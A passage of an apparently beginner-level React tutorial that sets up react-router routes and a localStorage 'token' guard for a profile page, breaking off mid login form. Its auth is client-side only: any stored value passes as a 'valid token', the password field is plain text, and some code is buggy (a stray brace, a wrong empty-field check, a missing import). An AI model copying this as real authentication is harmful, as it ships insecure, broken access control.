&lt;p&gt;We then have to replace the &lt;code&gt;React.StrictMode&lt;/code&gt; tags with this:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;BrowserRouter&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
    &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;App&lt;/span&gt; &lt;span class="o"&gt;/&amp;gt;&lt;/span&gt;
  &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="sr"&gt;/BrowserRouter&amp;gt;&lt;/span&gt;&lt;span class="err"&gt;,
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Now head over to &lt;code&gt;app.js&lt;/code&gt; and import this:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="k"&gt;import&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="nx"&gt;Routes&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;Route&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;from&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;react-router-dom&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="k"&gt;import&lt;/span&gt; &lt;span class="nx"&gt;Login&lt;/span&gt; &lt;span class="k"&gt;from&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;./login&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="k"&gt;import&lt;/span&gt; &lt;span class="nx"&gt;Profile&lt;/span&gt; &lt;span class="k"&gt;from&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;./Profile&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Inside our &lt;code&gt;return()&lt;/code&gt; lets delete our div and replace it with this:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;  &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;div&lt;/span&gt; &lt;span class="nx"&gt;className&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;App&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
    &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;Routes&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="c"&gt;&amp;lt;!--&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nx"&gt;what&lt;/span&gt; &lt;span class="nx"&gt;are&lt;/span&gt; &lt;span class="nx"&gt;routes&lt;/span&gt; &lt;span class="k"&gt;in&lt;/span&gt; &lt;span class="nx"&gt;react&lt;/span&gt;&lt;span class="o"&gt;-!&amp;gt;&lt;/span&gt;
      &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;Route&lt;/span&gt; &lt;span class="nx"&gt;path&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;/&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt; &lt;span class="nx"&gt;element&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;Login&lt;/span&gt;&lt;span class="o"&gt;/&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="sr"&gt;/&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;
&lt;/span&gt;      &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;Route&lt;/span&gt; &lt;span class="nx"&gt;path&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;/profile&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt; &lt;span class="nx"&gt;element&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;Profile&lt;/span&gt;&lt;span class="o"&gt;/&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="sr"&gt;/&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;
&lt;/span&gt;    &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="sr"&gt;/Routes&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;
&lt;/span&gt;    &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="sr"&gt;/div&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Here we are using the routes to the pages we'll be creating shortly. Next let's create a file called &lt;code&gt;Login.js&lt;/code&gt; in our &lt;code&gt;src&lt;/code&gt; folder and paste this:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="k"&gt;export&lt;/span&gt; &lt;span class="k"&gt;default&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;Login&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
    &lt;span class="o"&gt;&amp;lt;&amp;gt;&lt;/span&gt;
      &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;h1&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="nx"&gt;login&lt;/span&gt; &lt;span class="nx"&gt;page&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="sr"&gt;/h1&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;
&lt;/span&gt;    &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="sr"&gt;/&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;
&lt;/span&gt;  &lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;We'll also create another file called &lt;code&gt;Profile.js&lt;/code&gt; and paste this:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="k"&gt;export&lt;/span&gt; &lt;span class="k"&gt;default&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;Profile&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
    &lt;span class="o"&gt;&amp;lt;&amp;gt;&lt;/span&gt;
      &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;h1&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="nx"&gt;profile&lt;/span&gt; &lt;span class="nx"&gt;page&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="sr"&gt;/h1&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;
&lt;/span&gt;    &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="sr"&gt;/&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;
&lt;/span&gt;  &lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Now let's start our application:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight shell"&gt;&lt;code&gt;npm start
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--1HpjrPa0--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/1b2a3tlgmltrfge0schq.PNG" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--1HpjrPa0--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/1b2a3tlgmltrfge0schq.PNG" alt="login" width="589" height="407"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--BAsNSBy4--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/33c6aeisc0u5788rsugn.PNG" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--BAsNSBy4--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/33c6aeisc0u5788rsugn.PNG" alt="profile" width="499" height="452"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;As you can see, our page is working fine (also check the profile page by adding &lt;code&gt;/profile&lt;/code&gt; to the url). Now that we're done with basics, let's proceed to setting up our authentication.&lt;/p&gt;

&lt;p&gt;Let's create a new file in our &lt;code&gt;src&lt;/code&gt; folder called &lt;code&gt;Auth.js&lt;/code&gt; and paste this:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="k"&gt;import&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="nx"&gt;useLocation&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nx"&gt;Navigate&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;from&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;react-router-dom&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;

&lt;span class="k"&gt;export&lt;/span&gt; &lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;setToken&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;token&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;=&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;

    &lt;span class="nx"&gt;localStorage&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;setItem&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;temitope&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;token&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="c1"&gt;// make up your own token&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="k"&gt;export&lt;/span&gt; &lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;fetchToken&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;token&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;=&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;

    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nx"&gt;localStorage&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;getItem&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;temitope&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="k"&gt;export&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;RequireToken&lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt;&lt;span class="nx"&gt;children&lt;/span&gt;&lt;span class="p"&gt;}){&lt;/span&gt;

    &lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;auth&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;fetchToken&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;location&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;useLocation&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

    &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="nx"&gt;auth&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;

        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;Navigate&lt;/span&gt; &lt;span class="nx"&gt;to&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;/&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt; &lt;span class="nx"&gt;state&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{{&lt;/span&gt;&lt;span class="na"&gt;from&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;location&lt;/span&gt;&lt;span class="p"&gt;}}&lt;/span&gt;&lt;span class="sr"&gt;/&amp;gt;&lt;/span&gt;&lt;span class="err"&gt;;
&lt;/span&gt;    &lt;span class="p"&gt;}&lt;/span&gt;

    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nx"&gt;children&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Here we created variables setting our token, fetching and also requiring our token, so let's go back to our &lt;code&gt;app.js&lt;/code&gt; and import our token:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="k"&gt;import&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="nx"&gt;RequireToken&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;from&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;./Auth&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;We'll be adding some things in our &lt;code&gt;app.js&lt;/code&gt;. In our &lt;code&gt;Route path="/profile"&lt;/code&gt; let's make changes to the element by adding our &lt;code&gt;RequireToken&lt;/code&gt; so our &lt;code&gt;Route path="/profile"&lt;/code&gt; should look like this:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;Route&lt;/span&gt;
  &lt;span class="nx"&gt;path&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;/profile&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;
  &lt;span class="nx"&gt;element&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;RequireToken&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
      &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;Profile&lt;/span&gt; &lt;span class="o"&gt;/&amp;gt;&lt;/span&gt;
    &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="sr"&gt;/RequireToken&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;
&lt;/span&gt;  &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="sr"&gt;/&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;When we save this and go to our app we would see that our profile page is now protected and can only be accessed with a valid token. Now let's finish our login page with our login form. head over to login page clear all and paste this:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="k"&gt;import&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="nx"&gt;useNavigate&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;from&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;react-router&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="k"&gt;import&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="nx"&gt;fetchToken&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;from&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;./Auth&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="k"&gt;export&lt;/span&gt; &lt;span class="k"&gt;default&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;Login&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;navigate&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;useNavigate&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
  &lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;username&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;setUsername&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;useState&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;""&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;password&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;setPassword&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;useState&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;""&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

  &lt;span class="c1"&gt;//check to see if the fields are not empty&lt;/span&gt;
  &lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;login&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="nx"&gt;username&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="dl"&gt;""&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;password&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="dl"&gt;""&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="k"&gt;return&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="c1"&gt;// make api call to our backend. we'll leave this for later&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
  &lt;span class="p"&gt;};&lt;/span&gt;

  &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
    &lt;span class="o"&gt;&amp;lt;&amp;gt;&lt;/span&gt;
      &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;div&lt;/span&gt; &lt;span class="nx"&gt;style&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{{&lt;/span&gt; &lt;span class="na"&gt;minHeight&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;800&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="na"&gt;marginTop&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;30&lt;/span&gt; &lt;span class="p"&gt;}}&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
        &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;h1&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="nx"&gt;login&lt;/span&gt; &lt;span class="nx"&gt;page&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="sr"&gt;/h1&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;
&lt;/span&gt;        &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;div&lt;/span&gt; &lt;span class="nx"&gt;style&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{{&lt;/span&gt; &lt;span class="na"&gt;marginTop&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;30&lt;/span&gt; &lt;span class="p"&gt;}}&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
          &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nx"&gt;fetchToken&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;?&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
            &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;p&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="nx"&gt;you&lt;/span&gt; &lt;span class="nx"&gt;are&lt;/span&gt; &lt;span class="nx"&gt;logged&lt;/span&gt; &lt;span class="k"&gt;in&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="sr"&gt;/p&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;
&lt;/span&gt;          &lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
            &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;div&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
              &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;form&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
                &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;label&lt;/span&gt; &lt;span class="nx"&gt;style&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{{&lt;/span&gt; &lt;span class="na"&gt;marginRight&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;10&lt;/span&gt; &lt;span class="p"&gt;}}&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="nx"&gt;Input&lt;/span&gt; &lt;span class="nx"&gt;Username&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="sr"&gt;/label&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;
&lt;/span&gt;                &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;input&lt;/span&gt;
                  &lt;span class="nx"&gt;type&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;text&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;
                  &lt;span class="nx"&gt;onChange&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{(&lt;/span&gt;&lt;span class="nx"&gt;e&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nx"&gt;setUsername&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;e&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;target&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;value&lt;/span&gt;&lt;span class="p"&gt;)}&lt;/span&gt;
                &lt;span class="sr"&gt;/&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;
&lt;/span&gt;
                &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;label&lt;/span&gt; &lt;span class="nx"&gt;style&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{{&lt;/span&gt; &lt;span class="na"&gt;marginRight&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;10&lt;/span&gt; &lt;span class="p"&gt;}}&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="nx"&gt;Input&lt;/span&gt; &lt;span class="nx"&gt;Password&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="sr"&gt;/label&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;
&lt;/span&gt;                &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;input&lt;/span&gt;
                  &lt;span class="nx"&gt;type&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;text&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;
                  &lt;span class="nx"&gt;onChange&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{(&lt;/span&gt;&lt;span class="nx"&gt;e&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nx"&gt;setPassword&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;e&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;target&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;value&lt;/span&gt;&lt;span class="p"&gt;)}&lt;/span&gt;
                &lt;span class="sr"&gt;/&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;
&lt;/span&gt;
